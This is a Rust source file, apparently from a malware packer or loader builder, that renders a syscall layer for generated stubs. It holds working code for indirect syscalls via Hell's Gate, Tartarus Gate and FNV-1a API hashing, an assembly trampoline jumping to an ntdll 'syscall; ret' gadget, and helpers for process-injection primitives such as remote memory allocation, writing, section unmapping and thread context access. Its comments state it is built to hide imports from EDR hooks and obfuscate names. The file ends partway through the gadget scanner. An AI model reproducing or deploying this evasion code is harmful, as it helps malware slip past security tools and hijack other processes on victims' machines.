//! Syscall layer configuration and stub rendering.
//!
//! `build.stub.syscalls` (YAML) selects how the generated stub talks to the
//! kernel. It is a *loader* concern, not a pipeline technique: it changes how the
//! stub
//! invokes primitives, not how the payload runs. Two modes exist:
//!
//! - [`SyscallsMode::None`]: the technique fragments call the same `nt_*`
//!   helpers, but the helpers map to the plain Win32 APIs.
//! - [`SyscallsMode::Indirect`]: the helpers resolve SSNs at runtime (Hell's
//!   Gate from the live ntdll, Tartarus Gate from a clean copy read from disk,
//!   or API hashing matching each export by a precomputed FNV-1a hash) and
//!   invoke the kernel through the `syscall; ret` gadget in ntdll's `.text`,
//!   so the suspicious Win32 imports never appear in the IAT.
//!
//! The fragment contract is: technique fragments always call the `nt_*`
//! helpers (never the Win32 APIs directly), and the helper implementation
//! depends on the mode. A fragment never knows whether syscalls are active.
//!
//! The SSN table only contains the functions the active techniques need:
//! `TechniqueDef::syscalls` lists each technique's Nt* requirements and the
//! union (in the canonical [`NT_FUNCTIONS`] order) is what the stub resolves.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

use crate::error::{PackerError, Result};
use crate::techniques::RuntimeStep;

use super::obfuscation::StringsConfig;

/// Raw `build.stub.syscalls` YAML block, before semantic validation.
///
/// `mode` and `resolver` are kept as plain strings here so that
/// [`SyscallsConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlSyscallsConfig {
    /// Syscall mode (`none` or `indirect`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// SSN resolver (`hells_gate` or `tartarus_gate`).
    #[serde(default = "default_resolver")]
    pub resolver: String,
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_resolver() -> String {
    "hells_gate".to_string()
}

/// How the stub invokes the kernel.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallsMode {
    /// Plain Win32 calls; the helpers wrap the Win32 APIs directly.
    None,
    /// Indirect syscalls with runtime SSN resolution.
    Indirect,
}

impl SyscallsMode {
    /// Lowercase label used in the build summary.
    pub fn label(self) -> &'static str {
        match self {
            SyscallsMode::None => "none",
            SyscallsMode::Indirect => "indirect",
        }
    }
}

/// SSN resolution strategy for `mode: indirect`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Resolver {
    /// Hell's Gate: read the SSN from the Nt* stub prologue in the live ntdll.
    /// Fails with a clear error when an EDR has hooked the export stub.
    HellsGate,
    /// Tartarus Gate: read the SSN from a clean copy of ntdll read from disk,
    /// so hooks in the live ntdll's export stubs do not hide the SSN.
    TartarusGate,
    /// API hashing: resolve each SSN by a precomputed FNV-1a hash of its name,
    /// walking a clean copy of ntdll read from disk, so neither `GetProcAddress`
    /// nor any function-name string is needed.
    ApiHash,
}

impl Resolver {
    /// Lowercase label used in the verbose build output.
    pub fn label(self) -> &'static str {
        match self {
            Resolver::HellsGate => "hells_gate",
            Resolver::TartarusGate => "tartarus_gate",
            Resolver::ApiHash => "api_hash",
        }
    }
}

/// Resolved syscall-layer configuration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SyscallsConfig {
    /// How the stub invokes the kernel.
    pub mode: SyscallsMode,
    /// How the SSNs are resolved when the mode is `indirect`.
    pub resolver: Resolver,
}

impl Default for SyscallsConfig {
    fn default() -> Self {
        Self {
            mode: SyscallsMode::None,
            resolver: Resolver::HellsGate,
        }
    }
}

impl SyscallsConfig {
    /// Resolves the syscall config from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `resolver: hells_gate`). An
    /// unknown mode or resolver is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlSyscallsConfig>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => SyscallsMode::None,
            "indirect" => SyscallsMode::Indirect,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.mode '{other}': expected 'none' or 'indirect'"
                )));
            }
        };

        let resolver = match yaml.resolver.as_str() {
            "hells_gate" => Resolver::HellsGate,
            "tartarus_gate" => Resolver::TartarusGate,
            "api_hash" => Resolver::ApiHash,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate', \
                     'tartarus_gate' or 'api_hash'"
                )));
            }
        };

        Ok(Self { mode, resolver })
    }
}

/// One Nt* function the stub can invoke through the syscall layer.
struct NtFunction {
    /// Export name in ntdll (obfuscated with [`StringsConfig`] at render time).
    name: &'static str,
    /// Field of the generated `SsnTable` holding this function's SSN.
    table_field: &'static str,
    /// Name of the generated helper the technique fragments call.
    helper_name: &'static str,
    /// Helper body for `mode: none` (direct Win32 call).
    helper_none: &'static str,
    /// Helper body for `mode: indirect` (syscall through the gadget).
    helper_indirect: &'static str,
}

// --- Generated helper bodies -------------------------------------------------
//
// Each helper documents its Nt* signature in a comment (comments never reach
// the binary). The bodies are plain text injected into the generated stub;
// see the fragment contract in the module docs above.

/// `nt_alloc_vm`, mode none: VirtualAllocEx mapped to an NTSTATUS.
const ALLOC_VM_NONE: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
    /// &RegionSize, AllocationType, Protect). None mode: VirtualAllocEx with
    /// the result mapped to an NTSTATUS. The actual base comes back through
    /// `base`, the actual size through `size`.
    pub fn nt_alloc_vm(
        process: HANDLE,
        base: *mut *mut core::ffi::c_void,
        _zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        unsafe {
            let requested = if (*base).is_null() {
                None
            } else {
                Some(*base as *const core::ffi::c_void)
            };
            let address = VirtualAllocEx(
                process,
                requested,
                *size,
                VIRTUAL_ALLOCATION_TYPE(alloc_type),
                PAGE_PROTECTION_FLAGS(protect),
            );
            if address.is_null() {
                return STATUS_UNSUCCESSFUL;
            }
            *base = address;
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_alloc_vm`, mode indirect: syscall with the resolved SSN.
const ALLOC_VM_INDIRECT: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
    /// &RegionSize, AllocationType, Protect). BaseAddress/RegionSize are
    /// in-out pointers: the actual base/size come back through them.
    pub fn nt_alloc_vm(
        process: HANDLE,
        base: *mut *mut core::ffi::c_void,
        zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                zero_bits,
                size as usize,
                alloc_type as usize,
                protect as usize,
                ssns.alloc_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_write_vm`, mode none.
const WRITE_VM_NONE: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToWrite, &NumberOfBytesWritten). None mode:
    /// WriteProcessMemory mapped to an NTSTATUS.
    pub fn nt_write_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        unsafe {
            match WriteProcessMemory(process, base, buffer, size, Some(written)) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_write_vm`, mode indirect.
const WRITE_VM_INDIRECT: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToWrite, &NumberOfBytesWritten).
    pub fn nt_write_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                buffer as usize,
                size,
                written as usize,
                0,
                ssns.write_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_read_vm`, mode none.
const READ_VM_NONE: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToRead, &NumberOfBytesRead). None mode: ReadProcessMemory
    /// mapped to an NTSTATUS.
    pub fn nt_read_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        unsafe {
            match ReadProcessMemory(process, base, buffer, size, Some(read)) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_read_vm`, mode indirect.
const READ_VM_INDIRECT: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToRead, &NumberOfBytesRead).
    pub fn nt_read_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                buffer as usize,
                size,
                read as usize,
                0,
                ssns.read_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_resume_thread`, mode none.
const RESUME_THREAD_NONE: &str = r#"    /// NtResumeThread(ThreadHandle, &PreviousSuspendCount). None mode:
    /// ResumeThread mapped to an NTSTATUS.
    pub fn nt_resume_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        unsafe {
            let count = ResumeThread(thread);
            if count == u32::MAX {
                return STATUS_UNSUCCESSFUL;
            }
            if !previous.is_null() {
                *previous = count;
            }
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_resume_thread`, mode indirect.
const RESUME_THREAD_INDIRECT: &str = r#"    /// NtResumeThread(ThreadHandle, &PreviousSuspendCount).
    pub fn nt_resume_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                previous as usize,
                0,
                0,
                0,
                0,
                ssns.resume_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_unmap_view`, mode none: windows-rs does not declare
/// `NtUnmapViewOfSection`, so it is resolved dynamically (as before phase 6a).
/// `$NTDLL_DEF$` / `$UNMAP_FUNC_DEF$` are substituted by the renderer with
/// runtime-reconstructed (obfuscated) strings.
const UNMAP_VIEW_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type UnmapViewFn = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;

    /// NtUnmapViewOfSection(ProcessHandle, BaseAddress). None mode: resolve
    /// the export dynamically (windows-rs does not declare it) and call it.
    pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
        let address = resolve_nt_export(&$UNMAP_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let unmap: UnmapViewFn = unsafe { std::mem::transmute(address) };
        unsafe { unmap(process, base) }
    }
"#;

/// `nt_unmap_view`, mode indirect.
const UNMAP_VIEW_INDIRECT: &str = r#"    /// NtUnmapViewOfSection(ProcessHandle, BaseAddress).
    pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                0,
                0,
                0,
                0,
                ssns.unmap_view,
                *gadget,
            )
        }
    }
"#;

/// `nt_protect_vm`, mode none: VirtualProtectEx mapped to an NTSTATUS.
const PROTECT_VM_NONE: &str = r#"    /// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize,
    /// NewProtect, &OldProtect). None mode: VirtualProtectEx mapped to an
    /// NTSTATUS. The address and size are passed by value (the caller does
    /// not need the in-out results).
    pub fn nt_protect_vm(
        process: HANDLE,
        base: *mut core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        unsafe {
            match VirtualProtectEx(
                process,
                base,
                size,
                PAGE_PROTECTION_FLAGS(new_protect),
                old_protect as *mut PAGE_PROTECTION_FLAGS,
            ) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_protect_vm`, mode indirect: syscall with the resolved SSN.
const PROTECT_VM_INDIRECT: &str = r#"    /// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize,
    /// NewProtect, &OldProtect). BaseAddress/RegionSize are in-out pointers;
    /// the helpers expose them by value so the caller can ignore the results.
    pub fn nt_protect_vm(
        process: HANDLE,
        base: *mut core::ffi::c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let mut base_addr = base;
        let mut region = size;
        unsafe {
            nt_invoke(
                process.0 as usize,
                &mut base_addr as *mut _ as usize,
                &mut region as *mut _ as usize,
                new_protect as usize,
                old_protect as usize,
                0,
                ssns.protect_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_suspend_thread`, mode none: SuspendThread mapped to an NTSTATUS.
const SUSPEND_THREAD_NONE: &str = r#"    /// NtSuspendThread(ThreadHandle, &PreviousSuspendCount). None mode:
    /// SuspendThread mapped to an NTSTATUS.
    pub fn nt_suspend_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        unsafe {
            let count = SuspendThread(thread);
            if count == u32::MAX {
                return STATUS_UNSUCCESSFUL;
            }
            if !previous.is_null() {
                *previous = count;
            }
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_suspend_thread`, mode indirect.
const SUSPEND_THREAD_INDIRECT: &str = r#"    /// NtSuspendThread(ThreadHandle, &PreviousSuspendCount).
    pub fn nt_suspend_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                previous as usize,
                0,
                0,
                0,
                0,
                ssns.suspend_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_query_info_process`, mode none: windows-rs does not declare
/// `NtQueryInformationProcess`, so it is resolved dynamically (like
/// `nt_unmap_view`). `$QUERY_FUNC_DEF$` is substituted by the renderer with a
/// runtime-reconstructed (obfuscated) string.
const QUERY_INFO_PROCESS_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type QueryInfoFn = unsafe extern "system" fn(
        HANDLE,
        i32,
        *mut core::ffi::c_void,
        u32,
        *mut u32,
    ) -> i32;

    /// NtQueryInformationProcess(ProcessHandle, ProcessInformationClass,
    /// ProcessInformation, ProcessInformationLength, ReturnLength). None mode:
    /// resolve the export dynamically (windows-rs does not declare it).
    pub fn nt_query_info_process(
        process: HANDLE,
        info_class: i32,
        info: *mut core::ffi::c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32 {
        let address = resolve_nt_export(&$QUERY_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let query: QueryInfoFn = unsafe { std::mem::transmute(address) };
        unsafe { query(process, info_class, info, info_len, return_len) }
    }
"#;

/// `nt_query_info_process`, mode indirect.
const QUERY_INFO_PROCESS_INDIRECT: &str = r#"    /// NtQueryInformationProcess(ProcessHandle, ProcessInformationClass,
    /// ProcessInformation, ProcessInformationLength, ReturnLength).
    pub fn nt_query_info_process(
        process: HANDLE,
        info_class: i32,
        info: *mut core::ffi::c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                info_class as usize,
                info as usize,
                info_len as usize,
                return_len as usize,
                0,
                ssns.query_info_process,
                *gadget,
            )
        }
    }
"#;

/// `nt_get_context_thread`, mode none: windows-rs does not declare
/// `NtGetContextThread`, so it is resolved dynamically. `$GET_CONTEXT_FUNC_DEF$`
/// is substituted by the renderer with a runtime-reconstructed (obfuscated)
/// string.
const GET_CONTEXT_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type GetContextFn = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;

    /// NtGetContextThread(ThreadHandle, &Context). None mode: resolve the
    /// export dynamically (windows-rs does not declare it).
    pub fn nt_get_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
        let address = resolve_nt_export(&$GET_CONTEXT_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let get_context: GetContextFn = unsafe { std::mem::transmute(address) };
        unsafe { get_context(thread, context) }
    }
"#;

/// `nt_get_context_thread`, mode indirect.
const GET_CONTEXT_THREAD_INDIRECT: &str = r#"    /// NtGetContextThread(ThreadHandle, &Context).
    pub fn nt_get_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                context as usize,
                0,
                0,
                0,
                0,
                ssns.get_context_thread,
                *gadget,
            )
        }
    }
"#;

/// Every Nt* function the stub can invoke, in canonical (rendering) order.
const NT_FUNCTIONS: &[NtFunction] = &[
    NtFunction {
        name: "NtAllocateVirtualMemory",
        table_field: "alloc_vm",
        helper_name: "nt_alloc_vm",
        helper_none: ALLOC_VM_NONE,
        helper_indirect: ALLOC_VM_INDIRECT,
    },
    NtFunction {
        name: "NtWriteVirtualMemory",
        table_field: "write_vm",
        helper_name: "nt_write_vm",
        helper_none: WRITE_VM_NONE,
        helper_indirect: WRITE_VM_INDIRECT,
    },
    NtFunction {
        name: "NtReadVirtualMemory",
        table_field: "read_vm",
        helper_name: "nt_read_vm",
        helper_none: READ_VM_NONE,
        helper_indirect: READ_VM_INDIRECT,
    },
    NtFunction {
        name: "NtResumeThread",
        table_field: "resume_thread",
        helper_name: "nt_resume_thread",
        helper_none: RESUME_THREAD_NONE,
        helper_indirect: RESUME_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtUnmapViewOfSection",
        table_field: "unmap_view",
        helper_name: "nt_unmap_view",
        helper_none: UNMAP_VIEW_NONE,
        helper_indirect: UNMAP_VIEW_INDIRECT,
    },
    NtFunction {
        name: "NtProtectVirtualMemory",
        table_field: "protect_vm",
        helper_name: "nt_protect_vm",
        helper_none: PROTECT_VM_NONE,
        helper_indirect: PROTECT_VM_INDIRECT,
    },
    NtFunction {
        name: "NtSuspendThread",
        table_field: "suspend_thread",
        helper_name: "nt_suspend_thread",
        helper_none: SUSPEND_THREAD_NONE,
        helper_indirect: SUSPEND_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtQueryInformationProcess",
        table_field: "query_info_process",
        helper_name: "nt_query_info_process",
        helper_none: QUERY_INFO_PROCESS_NONE,
        helper_indirect: QUERY_INFO_PROCESS_INDIRECT,
    },
    NtFunction {
        name: "NtGetContextThread",
        table_field: "get_context_thread",
        helper_name: "nt_get_context_thread",
        helper_none: GET_CONTEXT_THREAD_NONE,
        helper_indirect: GET_CONTEXT_THREAD_INDIRECT,
    },
];

/// The Nt* function names the active techniques need, deduplicated and in the
/// canonical [`NT_FUNCTIONS`] order.
///
/// Techniques not in the pipeline contribute nothing, so their SSNs are never
/// resolved (and their names never emitted) — less work at startup and fewer
/// strings in the binary.
pub fn required(pipeline: &[RuntimeStep]) -> Vec<&'static str> {
    required_functions(pipeline)
        .into_iter()
        .map(|f| f.name)
        .collect()
}

/// The full [`NtFunction`] records the active techniques need.
fn required_functions(pipeline: &[RuntimeStep]) -> Vec<&'static NtFunction> {
    let mut needed: BTreeSet<&str> = BTreeSet::new();
    for step in pipeline {
        if let Some(def) = crate::techniques::find(step.name()) {
            needed.extend(def.syscalls.iter().copied());
        }
    }
    NT_FUNCTIONS
        .iter()
        .filter(|f| needed.contains(f.name))
        .collect()
}

/// FNV-1a 64-bit hash of a function name.
///
/// The API-hashing resolver embeds these hashes as numeric constants instead of
/// the (obfuscated) Nt* names, so it needs neither `GetProcAddress` nor a name
/// string. Mirrors the `api_hash` function emitted into the generated stub —
/// keep the two in sync.
fn api_hash(name: &[u8]) -> u64 {
    const OFFSET_BASIS: u64 = 0xcbf2_9ce4_8422_2325;
    const PRIME: u64 = 0x0000_0100_0000_01b3;
    let mut hash = OFFSET_BASIS;
    for &byte in name {
        hash ^= byte as u64;
        hash = hash.wrapping_mul(PRIME);
    }
    hash
}

/// Renders the `$SYSCALLS_BLOCK$` fragment for the given pipeline.
///
/// - No active technique needs syscalls: a no-op `init_syscalls`.
/// - `mode: none`: the `nt_*` helpers mapped to the direct Win32 APIs.
/// - `mode: indirect`: the full syscall layer (SSN table, resolver — Hell's
///   Gate, Tartarus Gate or API hashing —, ASM trampoline, gadget scanner) plus
///   the helpers.
pub fn render_block(
    config: &SyscallsConfig,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
) -> String {
    let required = required_functions(pipeline);
    if required.is_empty() {
        return assemble(
            "// --- Syscall layer ---\n// No active technique uses NT syscalls, so the layer is a no-op.",
            EMPTY_BODY,
            &["init_syscalls"],
        );
    }

    let (header, body) = match config.mode {
        SyscallsMode::None => (
            "// --- Syscall layer (build.stub.syscalls.mode = none) ---\n// Direct Win32 calls: the \
             fragments always call the nt_* helpers, which map to\n// the Win32 APIs below. The \
             DLL/function names are rebuilt at runtime from\n// obfuscated bytes injected by the \
             packer."
                .to_string(),
            render_none(&required, strings),
        ),
        SyscallsMode::Indirect => {
            let resolver = config.resolver.label();
            (
                format!(
                    "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = {resolver}) ---\n// \
                     Indirect syscalls with {resolver} SSN resolution. The Nt* names never\n// appear in \
                     the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
                     api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
                ),
                render_indirect(config, &required, strings),
            )
        }
    };

    let reexports: Vec<&str> = std::iter::once("init_syscalls")
        .chain(required.iter().map(|f| f.helper_name))
        .collect();
    assemble(&header, &body, &reexports)
}

/// Wraps the rendered body in `mod syscalls { ... }` and re-exports the
/// helpers the fragments call through `crate::`.
fn assemble(header: &str, body: &str, reexports: &[&str]) -> String {
    let mut block = format!("{header}\nmod syscalls {{\n{body}}}\n");
    block.push_str(&format!("use syscalls::{{{}}};\n", reexports.join(", ")));
    block
}

/// The block when no technique in the pipeline needs syscalls.
const EMPTY_BODY: &str = r#"    /// Initializes the syscall layer. A no-op here: no technique needs it.
    pub fn init_syscalls() -> Result<(), String> {
        Ok(())
    }
"#;

/// Prelude shared by every `mode: none` block (imports + no-op init).
const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
    };
    use windows::Win32::System::Threading::{ResumeThread, SuspendThread};

    const STATUS_SUCCESS: i32 = 0;
    /// Generic failure for a mapped Win32 call that has no real NTSTATUS.
    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;

    /// Initializes the syscall layer. A no-op when syscalls are disabled.
    pub fn init_syscalls() -> Result<(), String> {
        Ok(())
    }

    /// Resolves an ntdll export by name and returns its address (0 on failure).
    /// Used by the none-mode helpers for the Nt* functions windows-rs does not
    /// declare. The DLL/function names are reconstructed at runtime from the
    /// obfuscated bytes the packer injects.
    fn resolve_nt_export(name: &str) -> usize {
        let Ok(ntdll) = std::ffi::CString::new($NTDLL_DEF$) else {
            return 0;
        };
        let Ok(fn_name) = std::ffi::CString::new(name) else {
            return 0;
        };
        let Ok(module) = (unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }) else {
            return 0;
        };
        let Some(address) =
            (unsafe { GetProcAddress(module, PCSTR(fn_name.as_ptr() as *const u8)) })
        else {
            return 0;
        };
        address as usize
    }
"#;

/// Prelude of the `mode: indirect` block: trampoline, SSN table, gadget
/// scanner and the resolver body placeholder. `$SSN_FIELDS$` / `$SSN_INIT$` /
/// `$RESOLVER_BODY$` are filled by [`render_indirect`].
const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
    use std::sync::OnceLock;

    use windows::core::PCSTR;
    use windows::Win32::Foundation::{HANDLE, HMODULE};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    const STATUS_SUCCESS: i32 = 0;
    /// Generic failure when the layer was not initialized before a call.
    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;

    /// Invokes one NT syscall through the `syscall; ret` gadget in ntdll.
    ///
    /// Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9, every further
    /// argument on the caller's stack — after the return address and the
    /// 32-byte shadow space, the callee sees argument 5 at [rsp+40], 6 at
    /// [rsp+48], 7 at [rsp+56] and 8 at [rsp+64].
    ///
    /// The `syscall` instruction expects arguments 1-4 in the same registers,
    /// argument 1 *also* in r10, the SSN in eax, and arguments 5-6 at
    /// [rsp+8]/[rsp+16] (rsp points at the return address when the gadget
    /// runs). `nt_invoke` rearranges the frame accordingly and jumps into the
    /// gadget; the gadget's trailing `ret` pops our caller's return address
    /// and goes straight back to the Rust caller.
    extern "system" {
        fn nt_invoke(
            arg1: usize,
            arg2: usize,
            arg3: usize,
            arg4: usize,
            arg5: usize,
            arg6: usize,
            ssn: u32,
            gadget: usize,
        ) -> i32;
    }

    global_asm!(
        ".intel_syntax noprefix",
        ".global nt_invoke",
        "nt_invoke:",
        // Register args are already where the syscall wants them; only the
        // stack args (5/6) and the trailing SSN/gadget (7/8) need to move.
        "mov r10, rcx",        // r10 = arg1 (syscall argument convention)
        "mov rax, [rsp + 40]", // rax = arg5
        "mov [rsp + 8], rax",  // the syscall reads arg5 from [rsp+8]
        "mov rax, [rsp + 48]", // rax = arg6
        "mov [rsp + 16], rax", // the syscall reads arg6 from [rsp+16]
        "mov eax, [rsp + 56]", // eax = SSN
        "mov r11, [rsp + 64]", // r11 = gadget address (syscall; ret)
        "jmp r11",
    );

    /// SSNs resolved at startup. The packer emits exactly the fields the
    /// active techniques need.
    struct SsnTable {
$SSN_FIELDS$
    }

    static SSNS: OnceLock<SsnTable> = OnceLock::new();
    /// Address of the first `syscall; ret` gadget in ntdll's `.text`.
    static GADGET: OnceLock<usize> = OnceLock::new();

    /// Why the syscall layer failed to initialize.
    #[derive(Debug, thiserror::Error)]
    enum SyscallError {
        #[error("could not load the native API library")]
        NtdllNotFound,
        #[error("could not resolve '{0}'")]
        FunctionNotFound(String),
        #[error("the SSN could not be read from '{0}': the ntdll stub prologue is hooked (switch resolver to tartarus_gate)")]
        PatternMismatch(String),
        #[error("could not locate a syscall; ret gadget in ntdll")]
        GadgetNotFound,
        /// Reserved for helpers that wrap the NTSTATUS (later phases).
        #[error("syscall invocation failed (0x{0:08x})")]
        #[allow(dead_code)]
        InvocationFailed(i32),
    }

    /// Resolves every SSN the active techniques need and caches the gadget.
    /// The stub calls this once, before the techniques run.
    pub fn init_syscalls() -> Result<(), String> {
        let (table, gadget) = resolve_ssns().map_err(|e| e.to_string())?;
        let _ = SSNS.set(table);
        let _ = GADGET.set(gadget);
        Ok(())
    }

    /// Returns the SSN when `bytes` starts with the canonical prologue
    /// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`).
    /// Mirrors `engine::syscalls::parse_ssn_prologue` (unit-tested in the
    /// packer).
    fn parse_ssn(bytes: &[u8]) -> Option<u32> {
        let prologue = [0x4C, 0x8B, 0xD1, 0xB8];
        if bytes.len() < 8 || bytes[..4] != prologue {
            return None;
        }
        Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
    }

    /// Scans ntdll's `.text` section for the first `0F 05 C3` (syscall; ret).
    /// Mirrors `engine::syscalls::find_gadget_offset` (unit-tested in the
    /// packer).
    fn find_gadget(module: HMODULE) -> Result<usize, SyscallError> {
        let base = module.0 as usize;
        // ntdll is mapped at its preferred base, so RVAs are offsets from
        // `base`: walk the PE section table to find `.text` and scan it.
        let text = text_range(base).ok_or(SyscallError::GadgetNotFound)?;
        let bytes = unsafe { std::slice::from_raw_parts(text.0 as *const u8, text.1) };
        for (i, window) in bytes.windows(3).enumerate() {
            if window == [0x0F, 0x05, 0xC3] {
                return Ok(text.0 + i);
            }
        }
        Err(SyscallError::GadgetNotFound)
    }

